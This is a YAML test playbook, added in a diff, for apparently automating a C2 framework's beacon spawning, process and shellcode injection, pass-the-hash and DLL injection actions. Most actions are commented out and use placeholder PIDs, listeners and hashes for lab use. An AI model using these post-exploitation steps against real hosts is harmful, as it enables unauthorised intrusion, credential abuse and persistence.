@@ -1,0 +1,172 @@
+name: "Phase 7: Spawn & Inject Operations Test"
+# Beacon ID omitted - will prompt for interactive selection
+#
+# Tests: spawn_beacon, spawn_beacon_as_user, spawn_beacon_under,
+#        inject_beacon, spawn_shellcode, inject_shellcode,
+#        spawn_pth, inject_pth, inject_dll, inject_load_dll,
+#        spawn_postex_dll, inject_postex_dll
+# Prerequisites: Active beacon with admin privileges, a listener
+#                configured on the team server
+# Risk: HIGH - spawns new beacons, injects into processes
+#
+# NOTE: Most actions here require a running listener and will create
+#       new beacons or inject into processes. Use with caution.
+#       All actions are commented out by default - uncomment the
+#       ones appropriate for your lab setup.
+
+actions:
+  # -------------------------------------------------------
+  # Pre-flight: Verify we have what we need
+  # -------------------------------------------------------
+
+  - name: check_identity
+    type: getuid
+
+  - name: list_processes_for_injection
+    type: ps
+
+  # -------------------------------------------------------
+  # Beacon Spawning
+  # -------------------------------------------------------
+
+  # spawn_beacon - spawn a new beacon (requires active listener)
+  # Uncomment with your listener name:
+  #
+  # - name: spawn_beacon_test
+  #   type: spawn_beacon
+  #   parameters:
+  #     listener: "test-http"
+  #     arch: "x64"
+  #
+  # - name: pause_after_spawn
+  #   type: sleep
+  #   parameters:
+  #     duration: "5s"
+
+  # spawn_beacon_as_user - spawn beacon as different user
+  # Uncomment with valid credentials and listener:
+  #
+  # - name: spawn_as_user_test
+  #   type: spawn_beacon_as_user
+  #   parameters:
+  #     domain: "YOURDOMAIN"
+  #     user: "testuser"
+  #     password: "TestPassword123!"
+  #     listener: "test-http"
+
+  # spawn_beacon_under - spawn beacon under specific parent PID
+  # Uncomment with a valid PID and listener:
+  #
+  # - name: spawn_under_test
+  #   type: spawn_beacon_under
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     listener: "test-http"
+
+  # -------------------------------------------------------
+  # Beacon Injection
+  # -------------------------------------------------------
+
+  # inject_beacon - inject beacon into existing process
+  # Uncomment with a valid PID and listener:
+  #
+  # - name: inject_beacon_test
+  #   type: inject_beacon
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     listener: "test-http"
+  #     arch: "x64"
+
+  # -------------------------------------------------------
+  # Shellcode Spawn & Inject
+  # -------------------------------------------------------
+
+  # spawn_shellcode - spawn shellcode in new process
+  # Uncomment with path to shellcode on operator machine:
+  #
+  # - name: spawn_shellcode_test
+  #   type: spawn_shellcode
+  #   parameters:
+  #     arch: "x64"
+  #     shellcode: "/tmp/test_shellcode.bin"
+
+  # inject_shellcode - inject shellcode into existing process
+  # Uncomment with valid PID and shellcode:
+  #
+  # - name: inject_shellcode_test
+  #   type: inject_shellcode
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     arch: "x64"
+  #     shellcode: "/tmp/test_shellcode.bin"
+
+  # -------------------------------------------------------
+  # Pass-the-Hash
+  # -------------------------------------------------------
+
+  # spawn_pth - spawn beacon with NTLM hash
+  # Uncomment with a valid hash:
+  #
+  # - name: spawn_pth_test
+  #   type: spawn_pth
+  #   parameters:
+  #     domain: "YOURDOMAIN"
+  #     user: "admin"
+  #     ntlm_hash: "aad3b435b51404eeaad3b435b51404ee:REPLACE_WITH_NTLM_HASH"
+
+  # inject_pth - inject PtH token into existing process
+  # Uncomment with valid PID and hash:
+  #
+  # - name: inject_pth_test
+  #   type: inject_pth
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     arch: "x64"
+  #     domain: "YOURDOMAIN"
+  #     user: "admin"
+  #     ntlm_hash: "aad3b435b51404eeaad3b435b51404ee:REPLACE_WITH_NTLM_HASH"
+
+  # -------------------------------------------------------
+  # DLL Injection
+  # -------------------------------------------------------
+
+  # inject_dll - inject a DLL into a process
+  # Uncomment with valid PID and DLL path:
+  #
+  # - name: inject_dll_test
+  #   type: inject_dll
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     dll: "/opt/dlls/test.dll"
+
+  # inject_load_dll - reflective DLL injection from remote path
+  # Uncomment with valid PID and path:
+  #
+  # - name: inject_load_dll_test
+  #   type: inject_load_dll
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     path: "C:\\Temp\\test.dll"
+
+  # -------------------------------------------------------
+  # PostEx DLL Operations
+  # -------------------------------------------------------
+
+  # spawn_postex_dll - spawn and run a PostEx DLL
+  # Uncomment with valid PostEx DLL path:
+  #
+  # - name: spawn_postex_dll_test
+  #   type: spawn_postex_dll
+  #   parameters:
+  #     dll: "/opt/postex/test_postex.dll"
+  #     args: "test arguments"
+
+  # inject_postex_dll - inject PostEx DLL into a process
+  # Uncomment with valid PID and PostEx DLL path:
+  #
+  # - name: inject_postex_dll_test
+  #   type: inject_postex_dll
+  #   parameters:
+  #     pid: <REPLACE_WITH_PID>
+  #     dll: "/opt/postex/test_postex.dll"
+  #     args: "test arguments"
